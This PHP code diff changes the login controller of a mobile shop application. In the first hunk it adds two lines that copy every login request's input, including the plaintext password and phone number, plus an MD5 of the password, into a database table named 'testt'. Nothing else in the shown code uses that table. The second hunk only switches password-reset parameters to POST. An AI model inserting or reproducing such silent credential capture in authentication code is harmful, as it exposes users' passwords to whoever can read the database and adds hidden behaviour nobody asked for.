@@ -99,6 +99,10 @@ class Login extends MobileMall
             }            
         }
         $member = $model_member->getMemberInfo(array('member_mobile' => $phone));
+        
+        db('testt')->insertGetId(array('content'=>json_encode(input())));
+        db('testt')->insertGetId(array('content'=>md5(trim($password))));
+
         if (is_array($member) && !empty($member)) {
             $token = $this->_get_token($member['member_id'], $member['member_name'], $client);
             if ($token) {
@@ -134,10 +138,10 @@ class Login extends MobileMall
             output_error('系统没有开启手机找回密码功能','','error');
         }
         $phone       = input('post.mobile');
-        $password    = input('param.password');
-        $re_password = input('param.re_password');
-        $client      = input('param.client');
-        $log_type    = input('param.log_type');        
+        $password    = input('post.password');
+        $re_password = input('post.re_password');
+        $client      = input('post.client');
+        $log_type    = input('post.log_type');        
         switch ($log_type) {
             case 'sms_password':
                 $log_type=3;
